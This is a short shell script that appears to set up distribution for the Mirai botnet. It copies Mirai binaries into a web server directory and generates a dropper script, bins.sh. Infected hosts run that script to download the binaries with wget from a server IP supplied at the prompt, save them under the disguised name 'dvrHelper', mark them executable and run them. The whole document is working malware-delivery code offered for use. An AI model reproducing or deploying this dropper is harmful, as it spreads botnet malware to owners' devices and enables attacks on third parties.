read -p "Web server ip: " SERVER_IP

mkdir /var/www/html/bins
cp mirai* /var/www/html/bins

echo "#!/bin/sh
 
WEBSERVER=\"$SERVER_IP:80\"
 
 
BINARIES=\"mirai.dbg mirai.x86\"
 
for Binary in \$BINARIES; do
    wget http://\$WEBSERVER/bins/\$Binary -O dvrHelper
    chmod 777 dvrHelper
    ./dvrHelper
done" > /var/www/html/bins/bins.sh